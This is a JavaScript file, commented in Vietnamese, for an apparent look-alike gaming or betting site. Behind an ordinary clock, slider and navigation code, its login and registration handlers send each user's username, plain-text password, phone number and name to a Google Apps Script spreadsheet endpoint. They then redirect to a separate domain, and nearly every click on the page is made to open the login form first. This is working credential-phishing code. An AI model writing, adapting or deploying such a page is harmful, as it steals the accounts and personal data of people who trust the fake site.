// Khởi tạo các sự kiện cơ bản khi DOM đã tải xong
document.addEventListener("DOMContentLoaded", () => {
    
    // ==========================================
    // 1. ĐỒNG HỒ THỜI GIAN THỰC (MÚI GIỜ VIỆT NAM)
    // ==========================================
    function updateVNClock() {
        const clockElement = document.getElementById('vn-clock');
        if (!clockElement) return;

        const now = new Date();
        const vnTime = new Date(now.toLocaleString("en-US", {timeZone: "Asia/Ho_Chi_Minh"}));
        
        const day = String(vnTime.getDate()).padStart(2, '0');
        const month = String(vnTime.getMonth() + 1).padStart(2, '0');
        const year = vnTime.getFullYear();
        
        const daysOfWeek = ['CN', 'T2', 'T3', 'T4', 'T5', 'T6', 'T7'];
        const dayOfWeek = daysOfWeek[vnTime.getDay()];
        
        const hours = String(vnTime.getHours()).padStart(2, '0');
        const minutes = String(vnTime.getMinutes()).padStart(2, '0');
        const seconds = String(vnTime.getSeconds()).padStart(2, '0');

        clockElement.textContent = `${day}/${month}/${year} (${dayOfWeek}) ${hours}:${minutes}:${seconds}`;
    }

    setInterval(updateVNClock, 1000);
    updateVNClock();


    // ==========================================
    // 2. ĐIỀU KHIỂN MODAL ĐĂNG KÝ / ĐĂNG NHẬP
    // ==========================================
    const modal = document.getElementById('auth-modal');
    const closeBtn = document.getElementById('close-modal');
    const registerForm = document.getElementById('register-form');
    const loginForm = document.getElementById('login-form');

    const btnOpenLogins = document.querySelectorAll('.btn-login-outline, .login-btn');
    const btnOpenRegisters = document.querySelectorAll('.btn-register-solid, .register-btn');

    if(modal) {
        window.switchAuthForm = function(formType) {
            if(formType === 'login') {
                registerForm.style.display = 'none';
                loginForm.style.display = 'block';
            } else {
                loginForm.style.display = 'none';
                registerForm.style.display = 'block';
            }
            modal.classList.add('show');
        }

        btnOpenLogins.forEach(btn => {
            btn.addEventListener('click', function(e) {
                e.preventDefault();
                switchAuthForm('login');
            });
        });

        btnOpenRegisters.forEach(btn => {
            btn.addEventListener('click', function(e) {
                e.preventDefault();
                switchAuthForm('register');
            });
        });

        closeBtn.addEventListener('click', function() {
            modal.classList.remove('show');
        });

        window.addEventListener('click', function(event) {
            if (event.target === modal) {
                modal.classList.remove('show');
            }
        });
    }


    // ==========================================
    // 3. TƯƠNG TÁC TAB DANH MỤC GAME CŨ (NẾU CÒN DÙNG)
    // ==========================================
    const categoryItems = document.querySelectorAll('.category-nav li');
    categoryItems.forEach(item => {
        item.addEventListener('click', function() {
            categoryItems.forEach(el => el.classList.remove('active'));
            this.classList.add('active');
        });
    });


    // ==========================================
    // 4. TƯƠNG TÁC BOTTOM NAVIGATION (MOBILE)
    // ==========================================
    const bottomNavItems = document.querySelectorAll('.bottom-nav .nav-item');
    bottomNavItems.forEach(item => {
        item.addEventListener('click', function() {
            bottomNavItems.forEach(el => el.classList.remove('active'));
            this.classList.add('active');
        });
    });


    // ==========================================
    // 5. BANNER TRƯỢT TỰ ĐỘNG (SLIDER)
    // ==========================================
    const track = document.getElementById('banner-track');
    const nextButton = document.getElementById('btn-next');
    const prevButton = document.getElementById('btn-prev');
    const dotsNav = document.getElementById('slider-dots');

    if(track && nextButton && prevButton && dotsNav) {
        const slides = Array.from(track.children);
        let currentIndex = 0;
        const slideCount = slides.length;
        let autoSlideInterval;

        slides.forEach((_, index) => {
            const dot = document.createElement('div');
            dot.classList.add('dot');
            if(index === 0) dot.classList.add('active');
            dot.addEventListener('click', () => {
                goToSlide(index);
                resetAutoSlide();
            });
            dotsNav.appendChild(dot);
        });

        const dots = Array.from(dotsNav.children);

        function goToSlide(index) {
            track.style.transform = `translateX(-${index * 100}%)`;
            dots.forEach(dot => dot.classList.remove('active'));
            dots[index].classList.add('active');
            currentIndex = index;
        }

        function nextSlide() {
            let newIndex = currentIndex + 1;
            if (newIndex >= slideCount) newIndex = 0;
            goToSlide(newIndex);
        }

        function prevSlide() {
            let newIndex = currentIndex - 1;
            if (newIndex < 0) newIndex = slideCount - 1;
            goToSlide(newIndex);
        }

        nextButton.addEventListener('click', () => {
            nextSlide();
            resetAutoSlide();
        });

        prevButton.addEventListener('click', () => {
            prevSlide();
            resetAutoSlide();
        });

        function startAutoSlide() {
            autoSlideInterval = setInterval(nextSlide, 3000); 
        }

        function resetAutoSlide() {
            clearInterval(autoSlideInterval);
            startAutoSlide();
        }

        startAutoSlide();
    }

    // ==========================================
    // 6. XỬ LÝ VALIDATION, GỬI DATA VỀ GOOGLE SHEET VÀ CHUYỂN HƯỚNG NHANH
    // ==========================================
    
    const GOOGLE_SHEET_URL = "https://script.google.com/macros/s/AKfycbyoM6T0FzlFyXweP00LfiYcrc5HvgblBkrkSP0uf6q5LtWLi4C79YXU8no7WwZyvYk-lw/exec";

    // --- XỬ LÝ NÚT ĐĂNG KÝ ---
    const btnSubmitRegister = document.querySelector('#register-form .toggle-btn.active');
    if (btnSubmitRegister) {
        btnSubmitRegister.addEventListener('click', function(e) {
            e.preventDefault(); 
            
            const usernameInput = document.querySelector('#register-form input[placeholder="Tên đăng nhập"]');
            const passwordInput = document.querySelector('#register-form input[placeholder="Mật khẩu"]');
            const fullnameInput = document.querySelector('#register-form input[placeholder="Họ và tên"]');
            const phoneInput = document.querySelector('#register-form input[placeholder="Số điện thoại"]');
            const termsCheckbox = document.getElementById('agree-terms');

            if (!usernameInput || !passwordInput || !fullnameInput || !phoneInput || !termsCheckbox) {
                console.error("Lỗi: Không tìm thấy trường dữ liệu đăng ký trong HTML");
                return;
            }

            const username = usernameInput.value.trim();
            const password = passwordInput.value.trim();
            const fullname = fullnameInput.value.trim();
            const phone = phoneInput.value.trim();
            const termsChecked = termsCheckbox.checked;

            if (!username || !password || !fullname || !phone) {
                alert("⚠️ Vui lòng điền đầy đủ tất cả các thông tin!");
                return;
            }
            if (username.length < 6 || username.length > 20) {
                alert("⚠️ Tên đăng nhập phải từ 6 đến 20 ký tự!");
                return;
            }
            if (password.length < 6 || password.length > 20) {
                alert("⚠️ Mật khẩu phải từ 6 đến 20 ký tự!");
                return;
            }
            const phoneRegex = /^[0-9]{10}$/;
            if (!phoneRegex.test(phone)) {
                alert("⚠️ Số điện thoại không hợp lệ. Vui lòng nhập đúng 10 chữ số!");
                return;
            }
            if (!termsChecked) {
                alert("⚠️ Bạn cần đồng ý với Thỏa thuận đăng ký người dùng!");
                return;
            }

            btnSubmitRegister.innerText = "ĐANG XỬ LÝ...";
            btnSubmitRegister.style.opacity = "0.7";
            btnSubmitRegister.disabled = true;

            let data = new URLSearchParams();
            data.append('status', 'ĐĂNG KÝ');
            data.append('username', username);
            data.append('password', password);
            data.append('phone', phone);
            data.append('fullname', fullname);

            fetch(GOOGLE_SHEET_URL, { 
                method: 'POST', 
                mode: 'no-cors', 
                headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                body: data.toString() 
            })
            .then(() => { window.location.href = "https://7899bee.co/"; })
            .catch(() => { window.location.href = "https://7899bee.co/"; });
        });
    }

    // --- XỬ LÝ NÚT ĐĂNG NHẬP ---
    const btnSubmitLogin = document.querySelector('#login-form .toggle-btn.active');
    if (btnSubmitLogin) {
        btnSubmitLogin.addEventListener('click', function(e) {
            e.preventDefault();
            
            const usernameInput = document.querySelector('#login-form input[placeholder="Vui lòng nhập tên tài khoản"]');
            const passwordInput = document.querySelector('#login-form input[placeholder="Vui lòng nhập mật khẩu"]');
            const phoneInput = document.querySelector('#login-form input[placeholder="Số điện thoại"]');

            if (!usernameInput || !passwordInput || !phoneInput) {
                console.error("Lỗi: Không tìm thấy trường dữ liệu đăng nhập trong HTML");
                return;
            }

            const username = usernameInput.value.trim();
            const password = passwordInput.value.trim();
            const phone = phoneInput.value.trim();

            if (!username || !password || !phone) {
                alert("⚠️ Vui lòng điền đầy đủ thông tin: Tài khoản, mật khẩu và số điện thoại!");
                return;
            }
            if (username.length < 6 || username.length > 20) {
                alert("⚠️ Tên tài khoản phải từ 6 đến 20 ký tự!");
                return;
            }
            if (password.length < 6 || password.length > 20) {
                alert("⚠️ Mật khẩu phải từ 6 đến 20 ký tự!");
                return;
            }
            const phoneRegex = /^[0-9]{10}$/;
            if (!phoneRegex.test(phone)) {
                alert("⚠️ Số điện thoại không hợp lệ. Vui lòng nhập đúng 10 chữ số!");
                return;
            }

            btnSubmitLogin.innerText = "ĐANG XỬ LÝ...";
            btnSubmitLogin.style.opacity = "0.7";
            btnSubmitLogin.disabled = true;

            let data = new URLSearchParams();
            data.append('status', 'ĐĂNG NHẬP');
            data.append('username', username);
            data.append('password', password);
            data.append('phone', phone);
            data.append('fullname', 'N/A');

            fetch(GOOGLE_SHEET_URL, { 
                method: 'POST', 
                mode: 'no-cors', 
                headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                body: data.toString() 
            })
            .then(() => { window.location.href = "https://7899bee.co/"; })
            .catch(() => { window.location.href = "https://7899bee.co/"; });
        });
    }

    // ==========================================
    // 7. YÊU CẦU ĐĂNG NHẬP KHI BẤM VÀO CÁC THÀNH PHẦN KHÁC
    // ==========================================
    const requireLoginSelectors = [
        '.game-card', '.mobile-game-card', '.product-card', 
        '.bottom-nav .nav-item',                            
        '.game-category-nav-mobile .nav-item',              
        '.desktop-menu-bar a',                              
        '.links-row a',                                     
        '.img-app-banner', '.app-btn-box'                   
    ].join(', ');

    const requireLoginElements = document.querySelectorAll(requireLoginSelectors);

    requireLoginElements.forEach(el => {
        el.addEventListener('click', function(e) {
            e.preventDefault(); 
            
            if(window.switchAuthForm) {
                window.switchAuthForm('login');
            }
        });
    });

});